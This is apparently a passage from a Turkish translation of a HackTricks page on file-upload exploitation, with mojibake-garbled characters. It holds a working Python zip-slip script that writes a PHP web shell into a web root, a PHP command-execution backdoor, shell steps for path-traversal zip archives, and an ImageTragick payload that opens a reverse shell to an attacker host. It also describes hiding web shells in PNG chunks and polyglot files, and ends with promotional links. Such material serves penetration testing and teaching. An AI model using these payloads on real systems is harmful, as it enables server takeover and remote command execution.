Ek olarak, **evilarc ile symlink hilesi** bir seÃ§enektir. EÄŸer `/flag.txt` gibi bir dosyayÄ± hedef almak amaÃ§lanÄ±yorsa, o dosyaya bir symlink oluÅŸturulmalÄ±dÄ±r. Bu, evilarc'Ä±n iÅŸlemi sÄ±rasÄ±nda hata ile karÅŸÄ±laÅŸmamasÄ±nÄ± saÄŸlar.

AÅŸaÄŸÄ±da, kÃ¶tÃ¼ niyetli bir zip dosyasÄ± oluÅŸturmak iÃ§in kullanÄ±lan Python kodu Ã¶rneÄŸi bulunmaktadÄ±r:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Dosya sÄ±kÄ±ÅŸtÄ±rma kÃ¶tÃ¼ye kullanÄ±mÄ± iÃ§in dosya pÃ¼skÃ¼rtme**

Daha fazla ayrÄ±ntÄ± iÃ§in **orijinal yazÄ±ya bakÄ±n**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1. **Bir PHP Shell OluÅŸturma**: PHP kodu, `$_REQUEST` deÄŸiÅŸkeninden geÃ§irilen komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in yazÄ±lmÄ±ÅŸtÄ±r.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. **Dosya PÃ¼skÃ¼rtme ve SÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ Dosya OluÅŸturma**: Birden fazla dosya oluÅŸturulur ve bu dosyalarÄ± iÃ§eren bir zip arÅŸivi oluÅŸturulur.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3. **Hex DÃ¼zenleyici veya vi ile DeÄŸiÅŸtirme**: Zip iÃ§indeki dosyalarÄ±n adlarÄ±, "xxA"yÄ± deÄŸiÅŸtirerek dizinleri gezmek iÃ§in vi veya bir hex dÃ¼zenleyici kullanÄ±larak deÄŸiÅŸtirilir.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Bu iÃ§eriÄŸi bir resim uzantÄ±sÄ±yla yÃ¼kleyerek zafiyeti sÃ¶mÃ¼rÃ¼n **(ImageMagick, 7.0.1-1)** (exploit iÃ§in [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG Ä°Ã§ine PHP Shell GÃ¶mme

Bir PNG dosyasÄ±nÄ±n IDAT parÃ§asÄ±na bir PHP shell gÃ¶mmek, belirli gÃ¶rÃ¼ntÃ¼ iÅŸleme iÅŸlemlerini etkili bir ÅŸekilde atlayabilir. PHP-GD'den `imagecopyresized` ve `imagecopyresampled` iÅŸlevleri bu baÄŸlamda Ã¶zellikle Ã¶nemlidir, Ã§Ã¼nkÃ¼ genellikle gÃ¶rÃ¼ntÃ¼leri yeniden boyutlandÄ±rma ve Ã¶rnekleme iÅŸlemleri iÃ§in kullanÄ±lÄ±rlar. GÃ¶mÃ¼lÃ¼ PHP shell'in bu iÅŸlemlerden etkilenmemesi, belirli kullanÄ±m durumlarÄ± iÃ§in Ã¶nemli bir avantajdÄ±r.

Bu tekniÄŸin ayrÄ±ntÄ±lÄ± keÅŸfi, metodolojisi ve potansiyel uygulamalarÄ± aÅŸaÄŸÄ±daki makalede sunulmaktadÄ±r: ["PNG IDAT ParÃ§alarÄ±nda Web Shell Kodlama"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak, iÅŸlemin ve sonuÃ§larÄ±nÄ±n kapsamlÄ± bir anlayÄ±ÅŸÄ±nÄ± sunmaktadÄ±r.

Daha fazla bilgi iÃ§in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglot Dosyalar

Poliglot dosyalar, siber gÃ¼venlikte benzersiz bir araÃ§ olarak hizmet eder, aynÄ± anda birden fazla dosya biÃ§iminde geÃ§erli olabilen kameleonlar olarak iÅŸlev gÃ¶rÃ¼r. Ä°lginÃ§ bir Ã¶rnek [GIFAR](https://en.wikipedia.org/wiki/Gifar) adlÄ± bir hibriddir, hem bir GIF hem de bir RAR arÅŸivi olarak iÅŸlev gÃ¶rÃ¼r. Bu tÃ¼r dosyalar sadece bu eÅŸleÅŸmeyle sÄ±nÄ±rlÄ± deÄŸildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mÃ¼mkÃ¼ndÃ¼r.

Poliglot dosyalarÄ±n temel faydasÄ±, dosyalarÄ± tÃ¼rlerine gÃ¶re tarayan gÃ¼venlik Ã¶nlemlerini atlatma kapasitelerindedir. Ã‡eÅŸitli uygulamalarda yaygÄ±n olan bir uygulama, yalnÄ±zca belirli dosya tÃ¼rlerine izin vermek -Ã¶rneÄŸin JPEG, GIF veya DOC- potansiyel olarak zararlÄ± biÃ§imlerin (Ã¶rneÄŸin JS, PHP veya Phar dosyalarÄ±) oluÅŸturabileceÄŸi riski azaltmak iÃ§indir. Ancak, poliglot dosyalar, birden fazla dosya tÃ¼rÃ¼nÃ¼n yapÄ±sal kriterlerine uyarak bu kÄ±sÄ±tlamalarÄ± gizlice atlayabilir.

Uyum saÄŸlama yeteneklerine raÄŸmen, poliglotlar bazÄ± sÄ±nÄ±rlamalarla karÅŸÄ±laÅŸabilir. Ã–rneÄŸin, bir poliglot aynÄ± anda bir PHAR dosyasÄ±nÄ± (PHp ARÅŸiv) ve bir JPEG dosyasÄ±nÄ± temsil edebilirken, yÃ¼klemenin baÅŸarÄ±sÄ± platformun dosya uzantÄ±sÄ± politikalarÄ±na baÄŸlÄ± olabilir. Sistem, izin verilen uzantÄ±lar konusunda katÄ±ysa, bir poliglotun yalnÄ±zca yapÄ±sal ikili yapÄ±sÄ±, yÃ¼klemenin garantisi olmayabilir.

Daha fazla bilgi iÃ§in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Referanslar

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

EÄŸer **hacking kariyeri**ne ilgi duyuyorsanÄ±z ve hacklenemez olanÄ± hacklemek istiyorsanÄ±z - **iÅŸe alÄ±yoruz!** (_akÄ±cÄ± Polonyaca yazma ve konuÅŸma gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>SÄ±fÄ±rdan Kahraman'a AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keÅŸfedin**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek destek olun.**

</details>
